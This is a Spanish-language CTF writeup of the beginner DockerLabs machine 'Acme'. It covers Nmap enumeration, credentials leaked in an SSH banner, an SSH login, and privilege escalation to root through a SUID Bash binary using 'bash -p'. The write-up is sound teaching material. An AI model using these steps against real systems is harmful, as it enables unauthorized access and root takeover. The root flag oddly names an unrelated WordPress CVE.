# DockerLabs — Writeup: Acme (Muy Fácil)

> Laboratorio/CTF autorizado de DockerLabs. Este writeup documenta únicamente la resolución de la máquina **Acme**, catalogada como **Muy Fácil**.

En esta máquina trabajamos una cadena sencilla pero muy útil para principiantes:

- Comprobación de conectividad.
- Enumeración con **Nmap**.
- Revisión de una pista expuesta por el servicio web.
- Enumeración del banner de **SSH**.
- Obtención de credenciales temporales.
- Acceso inicial mediante SSH.
- Enumeración de binarios con bit **SUID**.
- Escalada de privilegios abusando de **Bash SUID**.

---

## 1. Reconocimiento inicial

Comenzamos comprobando que la máquina objetivo responde en la red:

```bash
ping -c 1 172.17.0.2
```

La respuesta confirma que el host se encuentra activo y accesible desde nuestra máquina atacante.

![Ping a la máquina Acme](./images/01-ping.png)

---

## 2. Enumeración de puertos y servicios

Realizamos un escaneo completo de puertos TCP con Nmap:

```bash
nmap -sS -sCV -Pn -n 172.17.0.2
```

Las opciones utilizadas nos permiten realizar un SYN Scan, ejecutar scripts básicos de NSE e identificar versiones de los servicios detectados.

Los puertos relevantes encontrados son:

```text
22/tcp open  ssh   OpenSSH 8.9p1
80/tcp open  http  Apache httpd 2.4.52
```

Además, Nmap detecta una entrada interesante en `robots.txt`:

```text
/_migration_notes.txt
```

También identifica el título de la aplicación web:

```text
ACME Corporation - Portal en Mantenimiento
```

![Escaneo Nmap de Acme](./images/02-nmap.png)

---

## 3. Enumeración del servicio web

Al acceder al servidor web mediante:

```text
http://172.17.0.2
```

nos encontramos con el portal de infraestructura de ACME en modo mantenimiento.

La propia aplicación proporciona una pista muy clara: el acceso a las consolas de gestión se realiza mediante **SSH** y recomienda iniciar una conexión con cualquier usuario para consultar el aviso del sistema.

![Portal web de ACME](./images/03-web-portal.png)

Durante el reconocimiento también revisamos el archivo encontrado por Nmap:

```text
http://172.17.0.2/migration_notes.txt
```

El memorando confirma que el acceso al servidor se canaliza por el puerto 22 y que debemos consultar el banner de conexión SSH.

![Archivo migration_notes.txt](./images/04-migration-notes.png)

Este paso demuestra por qué es importante revisar archivos expuestos por el servidor web y prestar atención a cualquier información obtenida durante la enumeración.

---

## 4. Enumeración del banner SSH

Siguiendo la pista anterior, intentamos iniciar una conexión SSH utilizando un usuario cualquiera:

```bash
ssh test@172.17.0.2
```

Antes de completar la autenticación, el servidor muestra un banner de mantenimiento que expone credenciales temporales:

```text
Usuario: usuario
Password: P@ssw0rd2026_CTF!
```

![Credenciales expuestas en el banner SSH](./images/05-ssh-banner.png)

Esto supone una **divulgación de información sensible**, ya que un usuario no autenticado puede obtener credenciales válidas simplemente iniciando una conexión al servicio SSH.

---

## 5. Acceso inicial mediante SSH

Utilizamos las credenciales obtenidas en el banner:

```bash
ssh usuario@172.17.0.2
```

Tras autenticarnos correctamente conseguimos una shell como el usuario:

```text
usuario
```

Comprobamos nuestra identidad:

```bash
whoami
```

Después enumeramos el directorio personal y encontramos la flag de usuario:

```bash
ls
cat user.txt
```

Resultado:

```text
FLAG{nmap_recon_ssh_foothold_7a9f24e1}
```

![Acceso SSH y flag de usuario](./images/06-ssh-access-user-flag.png)

Con esto obtenemos nuestro **foothold** o acceso inicial al sistema.

---

## 6. Enumeración local y búsqueda de SUID

Una vez dentro del sistema comenzamos la enumeración local.

Primero verificamos el UID y los grupos del usuario actual:

```bash
id
```

A continuación buscamos archivos que tengan activado el bit **SUID**:

```bash
find / -perm -4000 2>/dev/null
```

El significado del comando es el siguiente:

- `find /`: busca desde la raíz del sistema.
- `-perm -4000`: localiza archivos con el bit SUID activado.
- `2>/dev/null`: oculta los errores de permisos enviados a `stderr`.

Entre los resultados aparece:

```text
/usr/bin/bash
```

![Enumeración de binarios SUID](./images/07-suid-enumeration.png)

Que `/usr/bin/bash` tenga SUID activado es una configuración muy peligrosa si el binario pertenece a `root`.

El bit SUID permite que un programa se ejecute utilizando el **UID efectivo del propietario del archivo** en lugar del UID del usuario que lo ejecuta.

---

## 7. Escalada de privilegios con Bash SUID

Aprovechamos la configuración insegura ejecutando Bash en modo privilegiado:

```bash
/usr/bin/bash -p
```

La opción `-p` hace que Bash conserve los privilegios efectivos en lugar de descartarlos.

Comprobamos nuestra identidad:

```bash
whoami
```

El resultado es:

```text
root
```

Ya con privilegios máximos navegamos al directorio de root:

```bash
cd /
cd root
ls
cat root.txt
```

Y obtenemos la flag final:

```text
FLAG{wpShell_cve_2026_63030_core_rce_root_99d10c8b}
```

![Escalada a root y flag final](./images/08-root.png)

---

## 8. Resumen de la cadena de ataque

```text
Reconocimiento
      ↓
Ping
      ↓
Nmap
      ↓
Puerto 80 + robots.txt
      ↓
/migration_notes.txt
      ↓
Pista para revisar SSH
      ↓
Banner SSH
      ↓
Credenciales temporales expuestas
      ↓
SSH como usuario
      ↓
Enumeración SUID
      ↓
/usr/bin/bash con SUID
      ↓
/usr/bin/bash -p
      ↓
ROOT
```

---

## 9. Vulnerabilidades encontradas

| Vulnerabilidad / mala configuración | Impacto |
|---|---|
| Información sensible expuesta en el servicio web | Facilita la enumeración del servicio SSH |
| Credenciales expuestas en banner SSH | Acceso inicial con usuario válido |
| Bash con bit SUID activado | Escalada local directa a `root` |

---

## 10. Conclusión

**Acme** es una máquina muy sencilla, pero resulta útil para practicar una metodología básica de pentesting:

```text
Enumerar → analizar pistas → obtener acceso → enumerar localmente → escalar privilegios
```

La máquina también deja una lección importante: no siempre es necesario utilizar un exploit complejo o un CVE. Una mala configuración aparentemente pequeña, como exponer credenciales en un banner o asignar SUID a Bash, puede terminar provocando la **comprometición total del sistema**.
